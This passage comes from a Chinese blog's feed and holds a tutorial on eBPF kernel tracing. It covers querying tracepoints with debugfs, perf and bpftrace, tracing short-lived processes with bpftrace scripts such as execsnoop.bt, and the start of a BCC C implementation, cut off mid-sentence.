    <category term="面经" scheme="https://drun1baby.github.io/tags/%E9%9D%A2%E7%BB%8F/"/>
    
  </entry>
  
  <entry>
    <title>eBPF 内核跟踪</title>
    <link href="https://drun1baby.github.io/2023/08/06/eBPF-%E5%86%85%E6%A0%B8%E8%B7%9F%E8%B8%AA/"/>
    <id>https://drun1baby.github.io/2023/08/06/eBPF-%E5%86%85%E6%A0%B8%E8%B7%9F%E8%B8%AA/</id>
    <published>2023-08-06T07:38:53.000Z</published>
    <updated>2023-08-09T08:35:46.003Z</updated>
    
    <content type="html"><![CDATA[<p>eBPF 内核跟踪，eBPF 学习（四）</p><span id="more"></span><h1 id="eBPF-内核跟踪"><a href="#eBPF-内核跟踪" class="headerlink" title="eBPF 内核跟踪"></a>eBPF 内核跟踪</h1><p>今天我们先来看看，怎样使用 eBPF 去跟踪内核的状态，特别是最简单的 bpftrace 的使用方法。在下一讲中，我还将介绍两种 eBPF 程序的进阶编程方法。</p><p>上一讲中提到过，跟踪类 eBPF 程序主要包含内核插桩（<code>BPF_PROG_TYPE_KPROBE</code>）、跟踪点（<code>BPF_PROG_TYPE_TRACEPOINT</code>）以及性能事件（<code>BPF_PROG_TYPE_PERF_EVENT</code>）等程序类型，而每类 eBPF 程序类型又可以挂载到不同的内核函数、内核跟踪点或性能事件上。当这些内核函数、内核跟踪点或性能事件被调用的时候，挂载到其上的 eBPF 程序就会自动执行。</p><p>那么，你可能想问了：当我不知道内核中都有哪些内核函数、内核跟踪点或性能事件的时候，可以在哪里查询到它们的列表呢？对于内核函数和内核跟踪点，在需要跟踪它们的传入参数和返回值的时候，又该如何查询这些数据结构的定义格式呢？别担心，接下来就跟我一起去探索下吧。</p><h2 id="bpftrace-查询跟踪点的几种方法"><a href="#bpftrace-查询跟踪点的几种方法" class="headerlink" title="bpftrace 查询跟踪点的几种方法"></a>bpftrace 查询跟踪点的几种方法</h2><blockquote><p>官方文档 <a class="link" href="https://github.com/iovisor/bpftrace/blob/master/docs/reference_guide.md">https://github.com/iovisor/bpftrace/blob/master/docs/reference_guide.md<i class="fas fa-external-link-alt"></i></a></p></blockquote><h3 id="利用调试信息查询跟踪点"><a href="#利用调试信息查询跟踪点" class="headerlink" title="利用调试信息查询跟踪点"></a>利用调试信息查询跟踪点</h3><p>实际上，作为一个软件系统，内核也经常会发生各种各样的问题，比如安全漏洞、逻辑错误、性能差，等等。因此，内核本身的调试与跟踪一直都是内核提供的核心功能之一。</p><p>比如，为了方便调试，内核把所有函数以及非栈变量的地址都抽取到了  <code>/proc/kallsyms</code>  中，这样调试器就可以根据地址找出对应的函数和变量名称。很显然，具有实际含义的名称要比 16 进制的地址易读得多。对内核插桩类的 eBPF 程序来说，它们要挂载的内核函数就可以从  <code>/proc/kallsyms</code>  这个文件中查到。</p><p>注意，内核函数是一个非稳定 API，在新版本中可能会发生变化，并且内核函数的数量也在不断增长中。以 v5.13.0 为例，总的内核符号表数量已经超过了 16 万：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /proc/kallsyms | <span class="built_in">wc</span> -l</span><br><span class="line">165694</span><br></pre></td></tr></table></figure><p>不过需要提醒你的是，这些符号表不仅包含了内核函数，还包含了非栈数据变量。而且，并不是所有的内核函数都是可跟踪的，只有显式导出的内核函数才可以被 eBPF 进行动态跟踪。因而，通常我们并不直接从内核符号表查询可跟踪点，而是使用我接下来介绍的方法。</p><p>为了方便内核开发者获取所需的跟踪点信息，内核<a class="link" href="https://www.kernel.org/doc/html/latest/filesystems/debugfs.html">调试文件系统<i class="fas fa-external-link-alt"></i></a>还向用户空间提供了内核调试所需的基本信息，如内核符号列表、跟踪点、函数跟踪（ftrace）状态以及参数格式等。你可以在终端中执行  <code>sudo ls /sys/kernel/debug</code>  来查询内核调试文件系统的具体信息。比如，执行下面的命令，就可以查询  <code>execve</code>  系统调用的参数格式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">cat</span> /sys/kernel/debug/tracing/events/syscalls/sys_enter_execve/format</span><br></pre></td></tr></table></figure><p>注意，eBPF 程序的执行也依赖于调试文件系统。如果你的系统没有自动挂载它，那么我推荐你把它加入到系统开机启动脚本里面，这样机器重启后 eBPF 程序也可以正常运行。</p><p>有了调试文件系统，你就可以从  <code>/sys/kernel/debug/tracing</code>  中找到所有内核预定义的跟踪点，进而可以在需要时把 eBPF 程序挂载到对应的跟踪点。</p><p>除了内核函数和跟踪点之外，性能事件又该如何查询呢？你可以使用 Linux 性能工具  perf  来查询性能事件的列表。如下面的命令所示，你可以不带参数查询所有的性能事件，也可以加入可选的事件类型参数进行过滤：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo perf list [hw|sw|cache|tracepoint|pmu|sdt|metric|metricgroup]</span><br></pre></td></tr></table></figure><h3 id="利用-bpftrace-查询跟踪点"><a href="#利用-bpftrace-查询跟踪点" class="headerlink" title="利用 bpftrace 查询跟踪点"></a>利用 bpftrace 查询跟踪点</h3><p>虽然你可以利用内核调试信息和 perf 工具查询内核函数、跟踪点以及性能事件的列表，但它们的位置比较分散，并且用这种方法也不容易查询内核函数的定义格式。所以，我再给你推荐一个更好用的 eBPF 工具  <a class="link" href="https://github.com/iovisor/bpftrace/blob/master/docs/reference_guide.md">bpftrace<i class="fas fa-external-link-alt"></i></a>。</p><p>bpftrace 在 eBPF 和 BCC 之上构建了一个简化的跟踪语言，通过简单的几行脚本，就可以实现复杂的跟踪功能。并且，多行的跟踪指令也可以放到脚本文件中执行（脚本后缀通常为  <code>.bt</code>）。</p><p>如下图（图片来自 bpftrace文档）所示，bpftrace 会把你开发的脚本借助 BCC 编译加载到内核中执行，再通过 BPF 映射获取执行的结果：</p><img src="/2023/08/06/eBPF-%E5%86%85%E6%A0%B8%E8%B7%9F%E8%B8%AA/bpfTraceResult.png" class><p>因此，在编写简单的 eBPF 程序，特别是编写的 eBPF 程序用于临时的调试和排错时，你可以考虑直接使用 bpftrace ，而不需要用 C 或 Python 去开发一个复杂的程序。</p><ul><li>安装 bpf</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install -y bpftrace</span><br></pre></td></tr></table></figure><p>安装好 bpftrace 之后，你就可以执行  <code>bpftrace -l</code>  来查询内核插桩和跟踪点了。比如你可以通过以下几种方式来查询：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询所有内核插桩和跟踪点</span></span><br><span class="line">sudo bpftrace -l</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用通配符查询所有的系统调用跟踪点</span></span><br><span class="line">sudo bpftrace -l <span class="string">&#x27;tracepoint:syscalls:*&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用通配符查询所有名字包含&quot;execve&quot;的跟踪点</span></span><br><span class="line">sudo bpftrace -l <span class="string">&#x27;*execve*&#x27;</span></span><br></pre></td></tr></table></figure><p>对于跟踪点来说，你还可以加上  <code>-v</code>  参数查询函数的入口参数或返回值。而由于内核函数属于不稳定的 API，在 bpftrace 中只能通过  <code>arg0</code>、<code>arg1</code>  这样的参数来访问，具体的参数格式还需要参考内核源代码。</p><p>比如，下面就是一个查询系统调用  <code>execve</code>  入口参数（对应系统调用 <code>sys_enter_execve</code>）和返回值（对应系统调用 <code>sys_exit_execve</code>）的示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询execve入口参数格式</span></span><br><span class="line">$ sudo bpftrace -lv tracepoint:syscalls:sys_enter_execve</span><br><span class="line">tracepoint:syscalls:sys_enter_execve</span><br><span class="line">    int __syscall_nr</span><br><span class="line">    const char * filename</span><br><span class="line">    const char *const * argv</span><br><span class="line">    const char *const * envp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询execve返回值格式</span></span><br><span class="line">$ sudo bpftrace -lv tracepoint:syscalls:sys_exit_execve</span><br><span class="line">tracepoint:syscalls:sys_exit_execve</span><br><span class="line">    int __syscall_nr</span><br><span class="line">    long ret</span><br></pre></td></tr></table></figure><p>所以，你既可以通过内核调试信息和 perf 来查询内核函数、跟踪点以及性能事件的列表，也可以使用 bpftrace 工具来查询。</p><p>在这两种方法中，我更推荐使用更简单的 bpftrace 进行查询。这是因为，我们通常只需要在开发环境查询这些列表，以便去准备 eBPF 程序的挂载点。也就是说，虽然 bpftrace 依赖 BCC 和 LLVM 开发工具，但开发环境本来就需要这些库和开发工具。综合来看，用 bpftrace 工具来查询的方法显然更简单快捷。</p><p>在开发 eBPF 程序之前，还需要在这些长长的函数列表中进行选择，确定你应该挂载到哪一个上。那么，具体该如何选择呢？接下来，就进入我们的案例环节，一起看看内核跟踪点的具体使用方法。</p><h3 id="如何利用内核跟踪点排查短时进程问题？"><a href="#如何利用内核跟踪点排查短时进程问题？" class="headerlink" title="如何利用内核跟踪点排查短时进程问题？"></a>如何利用内核跟踪点排查短时进程问题？</h3><p>在排查系统 CPU 使用率高的问题时，我想你很可能遇到过这样的困惑：明明通过  top  命令发现系统的 CPU 使用率（特别是用户 CPU 使用率）特别高，但通过  ps、pidstat  等工具都找不出 CPU 使用率高的进程。这是什么原因导致的呢？你可以先停下来思考一下，再继续下面的内容。</p><p>你想到可能的原因了吗？在我看来，一般情况下，这类问题很可能是以下两个原因导致的：</p><ul><li>第一，应用程序里面直接调用其他二进制程序，并且这些程序的运行时间很短，通过  top  工具不容易发现；</li><li>第二，应用程序自身在不停地崩溃重启中，且重启间隔较短，启动过程中资源的初始化导致了高 CPU 使用率。</li></ul><p>使用  <code>top</code>、<code>ps</code>  等性能工具很难发现这类短时进程，这是因为它们都只会按照给定的时间间隔采样，而不会实时采集到所有新创建的进程。那要如何才能采集到所有的短时进程呢？你肯定已经想到了，那就是<strong>利用 eBPF 的事件触发机制，跟踪内核每次新创建的进程</strong>，这样就可以揪出这些短时进程。</p><p>要跟踪内核新创建的进程，首先得找到要跟踪的内核函数或跟踪点。如果你了解过 Linux 编程中创建进程的过程，我想你已经知道了，创建一个新进程通常需要调用  <code>fork()</code>  和  <code>execve()</code>  这两个标准函数，它们的调用过程如下图所示：</p><img src="/2023/08/06/eBPF-%E5%86%85%E6%A0%B8%E8%B7%9F%E8%B8%AA/newProcess.png" class><p>因为我们要关心的主要是新创建进程的基本信息，而像进程名称和参数等信息都在  <code>execve()</code>  的参数里，所以我们就要找出  <code>execve()</code>  所对应的内核函数或跟踪点。</p><p>借助刚才提到的  <code>bpftrace</code>  工具，你可以执行下面的命令，查询所有包含  <code>execve</code>  关键字的跟踪点：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo bpftrace -l <span class="string">&#x27;*execve*&#x27;</span></span><br></pre></td></tr></table></figure><p>命令执行后，你会得到如下的输出内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">kprobe:__ia32_compat_sys_execve</span><br><span class="line">kprobe:__ia32_compat_sys_execveat</span><br><span class="line">kprobe:__ia32_sys_execve</span><br><span class="line">kprobe:__ia32_sys_execveat</span><br><span class="line">kprobe:__x32_compat_sys_execve</span><br><span class="line">kprobe:__x32_compat_sys_execveat</span><br><span class="line">kprobe:__x64_sys_execve</span><br><span class="line">kprobe:__x64_sys_execveat</span><br><span class="line">kprobe:audit_log_execve_info</span><br><span class="line">kprobe:bprm_execve</span><br><span class="line">kprobe:do_execveat_common.isra.0</span><br><span class="line">kprobe:kernel_execve</span><br><span class="line">tracepoint:syscalls:sys_enter_execve</span><br><span class="line">tracepoint:syscalls:sys_enter_execveat</span><br><span class="line">tracepoint:syscalls:sys_exit_execve</span><br><span class="line">tracepoint:syscalls:sys_exit_execveat</span><br></pre></td></tr></table></figure><p>从输出中，你可以发现这些函数可以分为内核插桩（kprobe）和跟踪点（tracepoint）两类。在上一小节中我曾提到，内核插桩属于不稳定接口，而跟踪点则是稳定接口。因而，<strong>在内核插桩和跟踪点两者都可用的情况下，应该选择更稳定的跟踪点，以保证 eBPF 程序的可移植性（即在不同版本的内核中都可以正常执行）</strong>。</p><p>排除掉  kprobe  类型之后，剩下的  <code>tracepoint:syscalls:sys_enter_execve</code>、<code>tracepoint:syscalls:sys_enter_execveat</code>、<code>tracepoint:syscalls:sys_exit_execve</code>  以及  <code>tracepoint:syscalls:sys_exit_execveat</code>  就是我们想要的 eBPF 跟踪点。其中，<code>sys_enter_</code>  和  <code>sys_exit_</code>  分别表示在系统调用的入口和出口执行。</p><p>只有跟踪点的列表还不够，因为我们还想知道具体启动的进程名称、命令行选项以及返回值，而这些也都可以通过 bpftrace 来查询。在命令行中执行下面的命令，即可查询：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询sys_enter_execve入口参数</span></span><br><span class="line">$ sudo bpftrace -lv tracepoint:syscalls:sys_enter_execve</span><br><span class="line">tracepoint:syscalls:sys_enter_execve</span><br><span class="line">    int __syscall_nr</span><br><span class="line">    const char * filename</span><br><span class="line">    const char *const * argv</span><br><span class="line">    const char *const * envp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询sys_exit_execve返回值</span></span><br><span class="line">$ sudo bpftrace -lv tracepoint:syscalls:sys_exit_execve</span><br><span class="line">tracepoint:syscalls:sys_exit_execve</span><br><span class="line">    int __syscall_nr</span><br><span class="line">    long ret</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询sys_enter_execveat入口参数</span></span><br><span class="line">$ sudo bpftrace -lv tracepoint:syscalls:sys_enter_execveat</span><br><span class="line">tracepoint:syscalls:sys_enter_execveat</span><br><span class="line">    int __syscall_nr</span><br><span class="line">    int fd</span><br><span class="line">    const char * filename</span><br><span class="line">    const char *const * argv</span><br><span class="line">    const char *const * envp</span><br><span class="line">    int flags</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询sys_exit_execveat返回值</span></span><br><span class="line">$ sudo bpftrace -lv tracepoint:syscalls:sys_exit_execveat</span><br><span class="line">tracepoint:syscalls:sys_exit_execveat</span><br><span class="line">    int __syscall_nr</span><br><span class="line">    long ret</span><br></pre></td></tr></table></figure><p>从输出中可以看到，<code>sys_enter_execveat()</code>  比  <code>sys_enter_execve()</code>  多了两个参数，而文件名  <code>filename</code>、命令行选项  <code>argv</code>  以及返回值  ret 的定义都是一样的。</p><p>到这里，我带你使用 bpftrace 查询到了 execve 相关的跟踪点，以及这些跟踪点的具体格式。接下来，为了帮你全方位掌握 eBPF 程序的开发过程，我会以 bpftrace、BCC 和 libbpf 这三种方式为例，带你开发一个跟踪短时进程的 eBPF 程序。这三种方式各有优缺点，在实际的生产环境中都有大量的应用：</p><ul><li><strong>bpftrace 通常用在快速排查和定位系统上，它支持用单行脚本的方式来快速开发并执行一个 eBPF 程序</strong>。不过，bpftrace 的功能有限，不支持特别复杂的 eBPF 程序，也依赖于 BCC 和 LLVM 动态编译执行。</li><li><strong>BCC 通常用在开发复杂的 eBPF 程序中，其内置的各种小工具也是目前应用最为广泛的 eBPF 小程序</strong>。不过，BCC 也不是完美的，它依赖于 LLVM 和内核头文件才可以动态编译和加载 eBPF 程序。</li><li><strong>libbpf 是从内核中抽离出来的标准库，用它开发的 eBPF 程序可以直接分发执行，这样就不需要每台机器都安装 LLVM 和内核头文件了</strong>。不过，它要求内核开启 BTF 特性，需要非常新的发行版才会默认开启（如 RHEL 8.2+ 和 Ubuntu 20.10+ 等）。</li></ul><p>在实际应用中，你可以根据你的内核版本、内核配置、eBPF 程序复杂度，以及是否允许安装内核头文件和 LLVM 等编译工具等，来选择最合适的方案。</p><h3 id="bpftrace-方法"><a href="#bpftrace-方法" class="headerlink" title="bpftrace 方法"></a>bpftrace 方法</h3><p>这一讲我们先来看看，如何使用 bpftrace 来跟踪短时进程。</p><p>由于 <code>execve()</code> 和 <code>execveat()</code> 这两个系统调用的入口参数文件名 <code>filename</code> 和命令行选项 <code>argv</code> ，以及返回值  ret  的定义都是一样的，因而我们可以把这两个跟踪点放到一起来处理。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo bpftrace -e <span class="string">&#x27;tracepoint:syscalls:sys_enter_execve,tracepoint:syscalls:sys_enter_execveat &#123; printf(&quot;%-6d %-8s&quot;, pid, comm); join(args-&gt;argv);&#125;&#x27;</span></span><br></pre></td></tr></table></figure><img src="/2023/08/06/eBPF-%E5%86%85%E6%A0%B8%E8%B7%9F%E8%B8%AA/bpftraceTwoProcess.png" class><p>这个命令中的具体内容含义如下：</p><ul><li><code>bpftrace -e</code>  表示直接从后面的字符串参数中读入 bpftrace 程序（除此之外，它还支持从文件中读入 bpftrace 程序）；</li><li><code>tracepoint:syscalls:sys_enter_execve,tracepoint:syscalls:sys_enter_execveat</code>  表示用逗号分隔的多个跟踪点，其后的中括号表示跟踪点的处理函数；</li><li><code>printf()</code> 表示向终端中打印字符串，其用法类似于 C 语言中的 <code>printf()</code> 函数；</li><li><code>pid</code> 和 <code>comm</code> 是 bpftrace 内置的变量，分别表示进程 PID 和进程名称（你可以在其官方文档中找到其他的内置变量）；</li><li><code>join(args-&gt;argv)</code> 表示把字符串数组格式的参数用空格拼接起来，再打印到终端中。对于跟踪点来说，你可以使用  <code>args-&gt;参数名</code>  的方式直接读取参数（比如这里的 <code>args-&gt;argv</code> 就是读取系统调用中的 <code>argv</code> 参数）。</li></ul><p>在另一个终端中执行 ls 命令，然后你会在第一个终端中看到如下的输出：</p><img src="/2023/08/06/eBPF-%E5%86%85%E6%A0%B8%E8%B7%9F%E8%B8%AA/lsCommand.png" class><p>一个最简单的思路就是在系统调用的入口把参数保存到 BPF 映射中，然后再在系统调用出口获取返回值后一起输出。比如，你可以尝试执行下面的命令，把新进程的参数存入哈希映射中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 其中，tid表示线程ID，@execs[tid]表示创建一个哈希映射</span></span><br><span class="line">sudo bpftrace -e <span class="string">&#x27;tracepoint:syscalls:sys_enter_execve,tracepoint:syscalls:sys_enter_execveat &#123;@execs[tid] = join(args-&gt;argv);&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>很遗憾，这条命令并不能正常运行。根据下面的错误信息，你可以发现，<code>join()</code> 这个内置函数没有返回字符串，不能用来赋值：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stdin:1:90-106: ERROR: <span class="built_in">join</span>() should not be used <span class="keyword">in</span> an assignment or as a map key</span><br><span class="line">tracepoint:syscalls:sys_enter_execve,tracepoint:syscalls:sys_enter_execveat &#123;@execs[1] = <span class="built_in">join</span>(args-&gt;argv);&#125;</span><br></pre></td></tr></table></figure><p>实际上，在 bpftrace 的 GitHub 页面上，已经有其他用户汇报了同样的问题，并且到现在还是没有解决。</p><p>bpftrace 本身并不适用于所有的 eBPF 应用。如果是复杂的应用，我还是推荐使用 BCC 或者 libbpf 开发。</p><p>再举一用例，在解决短时进程引发的性能问题时，找出短时进程才是最重要的。至于短时进程的执行结果，我们一般可以通过日志看到详细的运行过程。</p><p>不过，这个跟踪程序还是有一些比较大的限制，比如：</p><ul><li>没有输出时间戳，这样去大量日志里面定位问题就比较困难；</li><li>没有父进程 PID，还需要一些额外的工具或经验，才可以找出父进程。</li></ul><p>那么，这些问题该如何解决呢？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">---------------- execsnoop.bt -----------------</span><br><span class="line"></span><br><span class="line">#!/usr/bin/bpftrace</span><br><span class="line"></span><br><span class="line">#include &lt;linux/sched.h&gt;</span><br><span class="line"></span><br><span class="line">BEGIN</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;%-9s %-6s %-6s %-16s %s\n&quot;, &quot;TIME&quot;, &quot;PID&quot;, &quot;PPID&quot;, &quot;COMM&quot;, &quot;ARGS&quot;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tracepoint:syscalls:sys_enter_execve,</span><br><span class="line">tracepoint:syscalls:sys_enter_execveat</span><br><span class="line">&#123;</span><br><span class="line">    $task = (struct task_struct *)curtask;</span><br><span class="line"></span><br><span class="line">    time(&quot;%H:%M:%S  &quot;);</span><br><span class="line">    printf(&quot;%-6d %-6d %-16s&quot;, pid, $task-&gt;parent-&gt;tgid, comm);</span><br><span class="line">    join(args-&gt;argv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="bpftrace-小结"><a href="#bpftrace-小结" class="headerlink" title="bpftrace 小结"></a>bpftrace 小结</h3><p>今天，我带你梳理了查询 eBPF 跟踪点的常用方法，并以短时进程的跟踪为例，通过 bpftrace 实现了短时进程的跟踪程序。</p><p>在跟踪内核时，你要记得，所有的内核跟踪都是被内核函数、内核跟踪点或性能事件等事件源触发后才执行的。所以，在跟踪内核之前，我们就需要通过调试信息、perf、bpftrace 等，找到这些事件源，然后再利用 eBPF 提供的强大功能去跟踪这些事件的执行过程。</p><p>bpftrace 是一个使用最为简单的 eBPF 工具，因此在初学 eBPF 时，建议你可以从它开始。bpftrace 提供了一个简单的脚本语言，只需要简单的几条脚本就可以实现很丰富的 eBPF 程序。它通常用在快速排查和定位系统上，并支持用单行脚本的方式来快速开发并执行一个 eBPF 程序。</p><h2 id="BCC-开发内核追踪程序"><a href="#BCC-开发内核追踪程序" class="headerlink" title="BCC 开发内核追踪程序"></a>BCC 开发内核追踪程序</h2><h3 id="BCC-方法"><a href="#BCC-方法" class="headerlink" title="BCC 方法"></a>BCC 方法</h3><p>我们先来看看如何使用 BCC 来开发上一讲中短时进程的跟踪程序。这里先说明下，由于  <code>execveat</code>  的处理逻辑同  <code>execve</code>  基本相同，限于篇幅的长度，接下来的 BCC 和 libbpf 程序都以  <code>execve</code>  为例。</p><p>这里先回顾一下之前的内容，使用 BCC 开发 eBPF 程序包含两部分</p><ul><li>第一部分是用 C 语言开发的 eBPF 程序。在 eBPF 程序中，你可以利用 BCC 提供的库函数和宏定义简化你的处理逻辑。</li><li>第二部分是用 Python 语言开发的前端界面，其中包含 eBPF 程序加载、挂载到内核函数和跟踪点，以及通过 BPF 映射获取和打印执行结果等部分。在前端程序中，你同样可以利用 BCC 库来访问 BPF 映射。</li></ul><h3 id="数据结构定义"><a href="#数据结构定义" class="headerlink" title="数据结构定义"></a>数据结构定义</h3><p>我们先看第一部分。为了在系统调用入口跟踪点和出口跟踪点间共享进程信息等数据，我们可以定义一个哈希映射（比如命名为  <code>tasks</code>）；同样地，因为我们想要在用户空间实时获取跟踪信息，这就需要一个性能事件映射。对于这两种映射的创建步骤，BCC 已经提供了非常方便的宏定义，你可以直接使用。</p><p>比如，你可以用下面的方式来创建这两个映射：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">data_t</span> &#123;</span></span><br><span class="line">    u32 pid;</span><br><span class="line">    <span class="type">char</span> comm[TASK_COMM_LEN];</span><br><span class="line">    <span class="type">int</span> retval;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> args_size;</span><br><span class="line">    <span class="type">char</span> argv[FULL_MAX_ARGS_ARR];</span><br><span class="line">&#125;;</span><br><span class="line">BPF_PERF_OUTPUT(events);</span><br><span class="line">BPF_HASH(tasks, u32, <span class="keyword">struct</span> <span class="type">data_t</span>);</span><br></pre></td></tr></table></figure><p>代码中指令的具体作用如下：</p><ul><li><code>struct data_t</code>  定义了一个包含进程基本信息的数据结构，它将用在哈希映射的值中（其中的参数大小  <code>args_size</code>  会在读取参数内容的时候用到）；</li><li><code>BPF_PERF_OUTPUT(events)</code>  定义了一个性能事件映射；</li><li><code>BPF_HASH(tasks, u32, struct data_t)</code>  定义了一个哈希映射，其键为 32 位的进程 PID，而值则是进程基本信息  <code>data_t</code>。</li></ul><p>两个映射定义好之后，接下来就是<strong>定义跟踪点的处理函数</strong>。在 BCC 中，你可以通过  <code>TRACEPOINT_PROBE(category, event)</code>  来定义一个跟踪点处理函数。BCC 会将所有的参数放入  <code>args</code>  这个变量中，这样使用  <code>args-&gt;&lt;参数名&gt;</code>  就可以访问跟踪点的参数值。</p><p>对我们要跟踪的短时进程问题来说，也就是下面这两个跟踪点：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义sys_enter_execve跟踪点处理函数.</span></span><br><span class="line">TRACEPOINT_PROBE(syscalls, sys_enter_execve)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//待添加处理逻辑</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义sys_exit_execve跟踪点处理函数.</span></span><br><span class="line">TRACEPOINT_PROBE(syscalls, sys_exit_execve)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//待添加处理逻辑</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="入口跟踪点处理"><a href="#入口跟踪点处理" class="headerlink" title="入口跟踪点处理"></a>入口跟踪点处理</h3><p>对于入口跟踪点  <code>sys_enter_execve</code>  的处理，还是按照上一讲中 bpftrace 的逻辑，先获取进程的 PID、进程名称和参数列表之后，再存入刚刚定义的哈希映射中。</p><p>其中，进程 PID 和进程名称都比较容易获取。如下面的代码所示，你可以调用  <code>bpf_get_current_pid_tgid()</code>  查询进程 PID，调用  <code>bpf_get_current_comm()</code>  读取进程名称：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取进程PID和进程名称</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">data_t</span> <span class="title">data</span> =</span> &#123; &#125;;</span><br><span class="line">u32 pid = bpf_get_current_pid_tgid();  <span class="comment">// 取低32位为进程PID</span></span><br><span class="line">data.pid = pid;</span><br><span class="line">bpf_get_current_comm(&amp;data.comm, <span class="keyword">sizeof</span>(data.comm));</span><br></pre></td></tr></table></figure><p>而命令行参数的获取就没那么容易了。因为 BCC 把所有参数都放到了  <code>args</code>  中，你可以使用  <code>args-&gt;argv</code>  来访问参数列表：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span> **argv = (<span class="type">const</span> <span class="type">char</span> **)(args-&gt;argv);</span><br></pre></td></tr></table></figure><p>注意，<code>argv</code>  是一个用户空间的字符串数组（指针数组），这就需要调用  <code>bpf_probe_read</code> 系列的辅助函数，去这些指针中读取数据。并且，字符串的数量（即参数的个数）和每个字符串的长度（即每个参数的长度）都是未知的，由于 eBPF 栈大小只有 512 